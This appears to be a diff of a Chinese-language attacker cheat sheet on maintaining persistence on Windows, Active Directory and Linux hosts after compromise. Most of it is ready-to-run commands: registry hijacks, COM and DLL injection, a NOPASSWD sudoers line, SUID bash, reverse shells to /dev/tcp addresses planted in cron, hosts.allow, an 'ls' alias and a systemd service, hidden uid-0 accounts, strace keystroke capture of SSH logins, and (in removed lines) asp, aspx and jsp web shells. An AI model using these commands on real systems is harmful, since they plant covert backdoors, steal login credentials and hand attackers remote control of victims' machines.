@@ -12,39 +12,17 @@
 
 <br>
 
-###### windows 19种
+后门是一种技术上的浪漫，隐秘的智慧、创造与破坏的张力，淋漓尽致。
+
+[TOC]
+
+## windows权限维持 19种
 
 粘滞键后门(映像劫持)，注册表和系统启动项，计划任务，服务 ，隐藏账户，影子账户
 
 <br>
 
 userinit(用户登录初始化)，logon script(优先av执行)，屏幕保护程序，waitfor，CLR( .NET程序劫持 )，Hijack CAccPropServicesClass and MMDeviceEnumerator( COM劫持 )，劫持MruPidlList，office(Word WLL,Excel XLL,PowerPoint VBA add-ins)，文件关联，AppInit_DLLs，Netsh helper，BITS，inf
-
-###### windows域 12种
-
-fake Ticket(Golden Ticket，Silver Ticket，Diamond Ticket，Sapphire Ticket)
-
-SID_history，DSRM，Skeleton Key，shadow credential，adminSDHolder，DCshadow，伪造域控
-
-委派，ACL滥用
-
-SSP，Hook PasswordChangeNotify
-
-###### linux 12种
-
-启动项，sudo/suid，crontab自动任务，SSH公钥免密，SSH软连接，后门用户，超级账户，alias后门，strace后门，SSH Wrapper后门，TCP Wrapper后门，system服务后门
-
-<br>
-
-###### other 2种
-
-cymothoa后门(被meterpreter代替)(进程注入)
-
-WMI后门
-
-<br>
-
-[TOC]
 
 #### 粘滞键后门(绕过TrustedInstaller权限,映像劫持:注册表实现)
 
@@ -147,11 +125,11 @@ reg import c:\main\000003ED.reg
 
 reg add "hklm\software\microsoft\windows nt\currentversion\winlogon" /v "Userinit" /t reg_sz /d "C:\Windows\system32\userinit.exe,c:\windows\system32\cmd.exe"
 
-logon script(优先av执行)
+#### logon script(优先av执行)
 
 reg add "hkcu\Environment" /v "UserInitMprLogonScript" /t reg_sz /d "c:\windows\system32\cmd.exe"
 
-屏幕保护程序
+#### 屏幕保护程序
 
 HKCU\Control Panel\Desktop
 
@@ -161,7 +139,7 @@ ScreenSaveActive - 1表示屏幕保护是启动状态，0表示表示屏幕保�
 
 ScreenSaverTimeout - 指定屏幕保护程序启动前系统的空闲事件，单位为秒，默认为900（15分钟）
 
-waitfor
+#### waitfor
 
 waitfor test && calc 表示接收信号成功后执行计算器
 
@@ -169,7 +147,7 @@ waitfor /s 192.168.163.143 /u qiyou /p qiyou /si test
 
 https://github.com/3gstudent/Waitfor-Persistence/blob/master/Waitfor-Persistence.ps1
 
-CLR( .NET程序劫持 )
+#### CLR( .NET程序劫持 )
 
 修改一下注册表，注册表路径：HKEY_CURRENT_USER\Software\Classes\CLSID\，新建子项{11111111-1111-1111-1111-111111111111}（名字随便，只要不与注册表中存在的名称冲突就行），然后再新建子项InProcServer32，新建一个键ThreadingModel，键值为：Apartment，默认的键值为我们dll的路径
 
@@ -181,7 +159,7 @@ SETX COR_ENABLE_PROFILING=1 /M
 
 SETX COR_PROFILER={11111111-1111-1111-1111-111111111111} /M
 
-Hijack CAccPropServicesClass and MMDeviceEnumerator( COM劫持 )
+#### Hijack CAccPropServicesClass and MMDeviceEnumerator( COM劫持 )
 
 在%APPDATA%\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}\下放入我们的后门dll，重命名为test._dl
 
@@ -189,7 +167,7 @@ Hijack CAccPropServicesClass and MMDeviceEnumerator( COM劫持 )
 
 PS：{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}对应CAccPropServicesClass，{BCDE0395-E52F-467C-8E3D-C4579291692E}对应MMDeviceEnumerator
 
-劫持MruPidlList
+#### 劫持MruPidlList
 
 在注册表位置为HKCU\Software\Classes\CLSID\下创建项{42aedc87-2188-41fd-b9a3-0c966feabec1}，再创建一个子项InprocServer32，默认的键值为我们的dll路径，再创建一个键ThreadingModel，其键值：Apartment
 
@@ -197,7 +175,7 @@ PS：{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}对应CAccPropServicesClass，{BCDE03
 
 当用户重启时或者重新创建一个explorer.exe进程时，就会加载我们的恶意dll文件，从而达到后门持久化的效果。
 
-office(Word WLL,Excel XLL,PowerPoint VBA add-ins)
+#### office(Word WLL,Excel XLL,PowerPoint VBA add-ins)
 
 Word WLL
 
@@ -229,7 +207,7 @@ office2013 — HKEY_CURRENT_USER\Software\Microsoft\Office\15.0\
 
 office2016 — HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\我这里使用的2010的，所以我们要修改的是HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\Excel\Options，添加一个键OPEN，键值为：/R test.dll
 
-PowerPoint VBA add-ins
+#### PowerPoint VBA add-ins
 
 用三好师傅powershell脚本生成现成的PowerPoint dll：
 
@@ -239,13 +217,13 @@ https://github.com/3gstudent/Office-Persistence
 
 文件关联
 
-AppInit_DLLs
+#### AppInit_DLLs
 
 User32.dll被加载到进程时，会读取AppInit_DLLs注册表项，如果有值，调用LoadLibrary() api加载用户dll。
 
 其注册表位置为：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs，把AppInit_DLLs的键值设置为我们dll路径，将LoadAppInit_DLLs设置为1
 
-Netsh helper
+#### Netsh helper
 
 关于helper dll的编写可以参考这个项目：https://github.com/outflanknl/NetshHelperBeacon
 
@@ -257,7 +235,7 @@ netsh add helper yourdll.dll
 
 其位置为：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh，创建一个键，名称随便，键值为我们dll的路径
 
-BITS
+#### BITS
 
 bitsadmin /create test
 
@@ -267,7 +245,7 @@ bitsadmin /SetNotifyCmdLine test cmd.exe "cmd.exe /c calc.exe"
 
 bitsadmin /resume test
 
-inf
+#### inf
 
 后门实现：
 
@@ -296,6 +274,188 @@ C:\windows\system32\calc.exe
 1.rundll32.exe advpack.dll,LaunchINFSection calc.inf,DefaultInstall
 
 2.重启电脑之后成功弹出计算器
+
+## linux权限维持 12种
+
+启动项，sudo/suid，crontab自动任务，SSH公钥免密，SSH软连接
+
+后门用户，超级账户
+
+<br>
+
+alias后门，strace后门，SSH Wrapper后门，TCP Wrapper后门，system服务后门
+
+#### 启动项
+
+```
+/etc/profile #登录系统shell时执行或者登录ssh的时候执行
+
+/etc/bashrc / /etc/bash.bashrc #当登录时或者每次打开新的shell都会执行 / 当退出登录shell时都执行
+
+.bash_profile / .profile #登录shell的时候执行一次
+
+.bashrc / .bash_logout  #当登录时或者每次打开新的shell都会执行 / 当退出登录shell时都执行
+
+执行顺序
+
+/etc/profile → /etc/profile.d/*.sh → ~/.bash_profile（或 ~/.profile）→ ~/.bashrc
+```
+
+#### sudo/suid
+
+```
+echo "Qsa3 ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers #添加用户sudo权限
+
+chmod u+s /usr/bin/bash #给/usr/bin/bash增加suid权限
+```
+
+#### crontab自动任务
+
+```
+/etc/crontab[cron.d/cron.daily/cron.hourly/cron.monthly/cron.weekly]
+
+echo '* * * * * root bash -c "bash -i &> /dev/tcp/192.168.10.132/443 0>&1"' >> /etc/crontab
+
+var目录下属于特定用户的自动任务不能写执行者，即上文的root
+
+创建文件时只能用 crontab - 方式，后续可写入文件（有些发行版可以>创建文件）
+
+/var/spool/cron/crontabs / /var/spool/cron/
+
+echo '* * * * * /bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.10.129/1234 0>&1"' | crontab -
+
+crontab -r #删除当前用户的所有定时任务
+
+crontab -l #查看当前用户的所有定时任务
+```
+
+#### SSH公钥免密
+
+```
+ssh-keygen -t rsa 按三次回车在~/.ssh文件夹生成id_rsa.pub id_rea
+
+\#ssh-keygen -t rsa -f ~/.ssh/id_rsa -N "" 无回显，不交互
+
+cp id_rsa.pub ~/.ssh/authorized_keys
+
+ssh -i id_rsa xxxx@xxx.xxx.xxx.xxx #使用私钥登录
+```
+
+#### SSH软连接
+
+```
+ln -sf /usr/sbin/sshd /tmp/su ; /tmp/su -oPort=10022 #创造软链接开放ssh服务在10022端口
+```
+
+#### 后门用户
+
+```
+useradd -m qwe
+
+echo "qwe:1qaz@WSX" | sudo chpasswd #无声设置用户密码
+
+sudo usermod -aG sudo qwe #将用户加入sudo组（便于ssh登录）
+
+\#sudo gpasswd -d qwe sudo #将用户移除sudo组（便于隐藏痕迹）
+```
+
+#### 超级账户
+
+```
+useradd -o -u 0 root_sham
+
+echo "root_sham:1qaz@WSX" | chpasswd
+```
+
+#### alias后门
+
+```
+alias ls='alerts(){ls $* --color=auto;bash -c "bash -i >&/dev/tcp/127.0.0.1/1234 0>&1 &"};alerts 2>/dev/null'       $* 将所有参数返回给原命令 最后一个&作用是将任务放在后台执行， 2>/dev/null然后将错误不显示出来
+
+unalias ls
+```
+
+#### Strace后门
+
+```
+strace -f -F -p `ps aux|grep "sshd -D"|grep -v grep|awk {'print $2'}` -t -e trace=read,write -s 32 2> /tmp/.sshd.log &   #监控键盘记录ssh登录记录
+
+cat /tmp/.sshd.log | grep -oP '"\\(10|f)\\0\\0\\0\K[^"]+(?=")'
+```
+
+#### SSH Wrapper后门(包装器后门,冒充服务后门，是一种思想，偷天换日思想) (实验：可能会导致服务无法正常启动）
+
+```
+mv /usr/sbin/sshd /usr/sbin/sshd_real #这里使用sshd举例
+
+touch /usr/sbin/sshd
+
+touch -r /usr/sbin/sshd_real /usr/sbin/sshd
+
+echo 'exec /usr/sbin/sshd_real "$@"' >> /usr/sbin/sshd  #新脚本运行完，指向真正的sshd脚本，服务器重启之后会执行
+```
+
+#### TCP Wrapper后门
+
+```
+/etc/hosts.allow #允许所有的连接，并且当连接出现时，启动bash进行反弹连接。
+
+echo 'ALL: ALL: spawn (bash -c "/bin/bash -i >& /dev/tcp/192.168.10.129/8888 0>&1") & :allow' >> /etc/hosts.allow
+
+ssh xxx@xxx.xxx.xxx.xxx #这里的xxx.xxx.xxx.xxx为靶机ip
+```
+
+#### systemd服务后门
+
+```
+/etc/systemd/system/backdoor.service
+
+\-----------------------------------------------------------
+
+[Unit]
+
+Description=Very important backdoor.
+
+After=network.target
+
+[Service]
+
+Type=forking
+
+ExecStart=/bin/bash -c "/bin/bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/xxx 0>&1"
+
+ExecReload=
+
+ExecStop=
+
+PrivateTmp=true
+
+[Install]
+
+WantedBy=multi-user.target
+
+\-----------------------------------------------------------
+
+chmod +x /etc/systemd/system/backdoor.service
+
+systemctl daemon-reload
+
+systemctl enable backdoor
+
+systemctl start backdoor
+```
+
+## windows域权限维持 12种
+
+fake Ticket(Golden Ticket，Silver Ticket，Diamond Ticket，Sapphire Ticket)
+
+SID_history，DSRM，Skeleton Key，shadow credential，adminSDHolder，DCshadow，伪造域控
+
+委派，ACL滥用
+
+<br>
+
+SSP，Hook PasswordChangeNotify
 
 #### fake Ticket
 
@@ -562,194 +722,4 @@ powershell -ep bypass ". .\Invoke-ReflectivePEInjection.ps1 ; Invoke-ReflectiveP
 
 
 type c:\windows\temp\passwords.txt
-```
-
-## linux权限维持
-
-后门是一种技术上的浪漫，隐秘的智慧、创造与破坏的张力，淋漓尽致。
-
-#### 后门
-
-```
-bash : /bin/bash -c "/bin/bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/80 0>&1"
-
-php : 
-
-asp : <%execute(request("cmd"))%>
-
-aspx : <%@ Page Language="Jscript" validateRequest="false" %><%Response.Write(eval(Request.Item["w"],"unsafe"));%>
-
-jsp : <% Process process = Runtime.getRuntime().exec(request.getParameter("cmd"));%> (无回显)
-```
-
-#### 启动项
-
-```
-/etc/profile #登录系统shell时执行或者登录ssh的时候执行
-
-/etc/bashrc / /etc/bash.bashrc #当登录时或者每次打开新的shell都会执行 / 当退出登录shell时都执行
-
-.bash_profile / .profile #登录shell的时候执行一次
-
-.bashrc / .bash_logout  #当登录时或者每次打开新的shell都会执行 / 当退出登录shell时都执行
-
-执行顺序
-
-/etc/profile → /etc/profile.d/*.sh → ~/.bash_profile（或 ~/.profile）→ ~/.bashrc
-```
-
-#### sudo/suid
-
-```
-echo "Qsa3 ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers #添加用户sudo权限
-
-chmod u+s /usr/bin/bash #给/usr/bin/bash增加suid权限
-```
-
-#### crontab自动任务
-
-```
-/etc/crontab[cron.d/cron.daily/cron.hourly/cron.monthly/cron.weekly]
-
-echo '* * * * * root bash -c "bash -i &> /dev/tcp/192.168.10.132/443 0>&1"' >> /etc/crontab
-
-var目录下属于特定用户的自动任务不能写执行者，即上文的root
-
-创建文件时只能用 crontab - 方式，后续可写入文件（有些发行版可以>创建文件）
-
-/var/spool/cron/crontabs / /var/spool/cron/
-
-echo '* * * * * /bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.10.129/1234 0>&1"' | crontab -
-
-crontab -r #删除当前用户的所有定时任务
-
-crontab -l #查看当前用户的所有定时任务
-```
-
-#### SSH公钥免密
-
-```
-ssh-keygen -t rsa 按三次回车在~/.ssh文件夹生成id_rsa.pub id_rea
-
-\#ssh-keygen -t rsa -f ~/.ssh/id_rsa -N "" 无回显，不交互
-
-cp id_rsa.pub ~/.ssh/authorized_keys
-
-ssh -i id_rsa xxxx@xxx.xxx.xxx.xxx #使用私钥登录
-```
-
-#### SSH软连接
-
-```
-ln -sf /usr/sbin/sshd /tmp/su ; /tmp/su -oPort=10022 #创造软链接开放ssh服务在10022端口
-```
-
-#### 后门用户
-
-```
-useradd -m qwe
-
-echo "qwe:1qaz@WSX" | sudo chpasswd #无声设置用户密码
-
-sudo usermod -aG sudo qwe #将用户加入sudo组（便于ssh登录）
-
-\#sudo gpasswd -d qwe sudo #将用户移除sudo组（便于隐藏痕迹）
-```
-
-#### 超级账户
-
-```
-useradd -o -u 0 root_sham
-
-echo "root_sham:1qaz@WSX" | chpasswd
-```
-
-#### alias后门
-
-```
-alias ls='alerts(){ls $* --color=auto;bash -c "bash -i >&/dev/tcp/127.0.0.1/1234 0>&1 &"};alerts 2>/dev/null'       $* 将所有参数返回给原命令 最后一个&作用是将任务放在后台执行， 2>/dev/null然后将错误不显示出来
-
-unalias ls
-```
-
-#### Strace后门
-
-```
-strace -f -F -p `ps aux|grep "sshd -D"|grep -v grep|awk {'print $2'}` -t -e trace=read,write -s 32 2> /tmp/.sshd.log &   #监控键盘记录ssh登录记录
-
-cat /tmp/.sshd.log | grep -oP '"\\(10|f)\\0\\0\\0\K[^"]+(?=")'
-```
-
-#### SSH Wrapper后门(包装器后门,冒充服务后门，是一种思想，偷天换日思想) (实验：可能会导致服务无法正常启动）
-
-```
-mv /usr/sbin/sshd /usr/sbin/sshd_real #这里使用sshd举例
-
-touch /usr/sbin/sshd
-
-touch -r /usr/sbin/sshd_real /usr/sbin/sshd
-
-echo 'exec /usr/sbin/sshd_real "$@"' >> /usr/sbin/sshd  #新脚本运行完，指向真正的sshd脚本，服务器重启之后会执行
-```
-
-#### TCP Wrapper后门
-
-```
-/etc/hosts.allow #允许所有的连接，并且当连接出现时，启动bash进行反弹连接。
-
-echo 'ALL: ALL: spawn (bash -c "/bin/bash -i >& /dev/tcp/192.168.10.129/8888 0>&1") & :allow' >> /etc/hosts.allow
-
-ssh xxx@xxx.xxx.xxx.xxx #这里的xxx.xxx.xxx.xxx为靶机ip
-```
-
-#### systemd服务后门
-
-```
-/etc/systemd/system/backdoor.service
-
-\-----------------------------------------------------------
-
-[Unit]
-
-Description=Very important backdoor.
-
-After=network.target
-
-[Service]
-
-Type=forking
-
-ExecStart=/bin/bash -c "/bin/bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/xxx 0>&1"
-
-ExecReload=
-
-ExecStop=
-
-PrivateTmp=true
-
-[Install]
-
-WantedBy=multi-user.target
-
-\-----------------------------------------------------------
-
-chmod +x /etc/systemd/system/backdoor.service
-
-systemctl daemon-reload
-
-systemctl enable backdoor
-
-systemctl start backdoor
-```
-
-#### wmi
-
-```
-Import-Module .\Persistence\Persistence.psm1
-
-$ElevatedOptions = New-ElevatedPersistenceOption -PermanentWMI -Daily -At '3 PM'
-
-$UserOptions = New-UserPersistenceOption -Registry -AtLogon
-
-Add-Persistence -FilePath .\EvilPayload.ps1 -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose
 ```
